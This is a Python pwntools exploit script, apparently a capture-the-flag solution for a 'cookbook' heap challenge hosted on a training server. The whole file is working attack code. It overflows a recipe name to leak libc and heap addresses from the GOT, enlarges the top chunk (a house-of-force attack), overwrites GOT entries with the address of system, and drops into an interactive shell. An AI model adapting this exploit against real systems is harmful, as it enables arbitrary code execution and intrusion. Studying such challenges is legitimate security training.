from pwn import *
import time

#context.terminal = ['tmux', 'splitw', '-h']
#p = process("./cookbook")
p = remote("training.jinblack.it", 2017)
#gdb.attach(p, '''b *0x08048bbc c''')
#context.log_level = 'debug'

#f = elf.ELF('./cookbook')
libc = elf.ELF('./libc-2.27.so')

raw_input("Wait")

#INIT

def insertName(name):
	p.recvuntil("what's your name?\n")
	p.sendline(name)
	time.sleep(0.2)

#initial menu
def createRecipe():
	p.recvuntil("[q]uit")
	p.sendline("c")
	time.sleep(0.2)

def giveCookBookName(dimHex, name):
	p.recvuntil("[q]uit")
	p.sendline("g")
	time.sleep(0.2)
	p.recvuntil(": ")
	p.sendline(str(dimHex))
	time.sleep(0.2)
	p.sendline(name)
	time.sleep(0.2)

def addIngredientInital():
	p.recvuntil("[q]uit")
	p.sendline("a")
	time.sleep(0.2)

#recipe menu
def newRecipe():
	p.recvuntil("[q]uit")
	p.sendline("n")
	time.sleep(0.2)

def addIngredient():
	p.recvuntil("[q]uit\n")
	p.sendline("a")
	time.sleep(0.2)
	p.recvuntil("which ingredient to add? ")
	p.sendline("corn")
	time.sleep(0.2)
	p.recvuntil("how many? (hex): ")
	p.sendline("0x41")
	time.sleep(0.2)

def giveRecipeName(name):
	p.recvuntil("[q]uit")
	p.sendline("g")
	time.sleep(0.2)
	p.sendline(name)
	time.sleep(0.2)

def printCurrentRecipe():
	p.recvuntil("[q]uit")
	p.sendline("p")
	time.sleep(0.2)

def exitFromRecipe():
	p.recvuntil("[q]uit")
	p.sendline("q")
	time.sleep(0.2)

#add_ingredient menu
def newIngredient():
	p.recvuntil("[e]xport saving changes (doesn't quit)?\n")
	p.sendline("n")
	time.sleep(0.2)

def setPrice(price):
	p.recvuntil("[e]xport saving changes (doesn't quit)?\n")
	p.sendline("n")
	time.sleep(0.2)
	p.sendline(price)
	time.sleep(0.2)

insertName("Davide")

freeGot = 0x0804d018
atoiGot = 0x0804d044
top_chunk = 0x0804f858

createRecipe()
newRecipe()

addIngredient()

#PER LEAK LIBC
payload = "A"*900 + p64(freeGot)
giveRecipeName(payload)
printCurrentRecipe()
p.recvuntil("- ")
leak1 = u32(p.recv(4)) #leak corrisponde alla fgets
print "LEAK1: %#x" % leak1
libc_base = leak1 - libc.symbols['fgets']
systemAddr = libc_base + libc.symbols['system']
setvbufAddr = libc_base + libc.symbols['setvbuf']
callocAddr = libc_base + libc.symbols['calloc']
print "LIBC_BASE: %#x" % libc_base
print "SYSTEM: %#x" % systemAddr

#PER LEAK HEAP
payload = "A"*900 + p64(0x0804d098)
giveRecipeName(payload)
printCurrentRecipe()
p.recvuntil("- ")
leak2 = u32(p.recv(4)) #leak heap
print "LEAK2: %#x" % leak2
heap_base = leak2 - 0x1450
topChunkAddr = heap_base + 0x1858
print "HEAP_BASE: %#x" % heap_base
print "TOP_CHUNK: %#x" % topChunkAddr

#CAMBIO DIM TOP_CHUNK
payload = "\xff\xff\xff\xff"*0xe9
giveRecipeName(payload)

exitFromRecipe()

to_malloc = atoiGot - topChunkAddr + 0x1cd8 + 28
giveCookBookName(to_malloc, "\x00")
time.sleep(0.1)
payload = p32(setvbufAddr)+p32(systemAddr)+p32(callocAddr)
giveCookBookName(0xd, payload)
time.sleep(0.1)

#addIngredientInital()
#newIngredient()
#setPrice("ls")


p.interactive()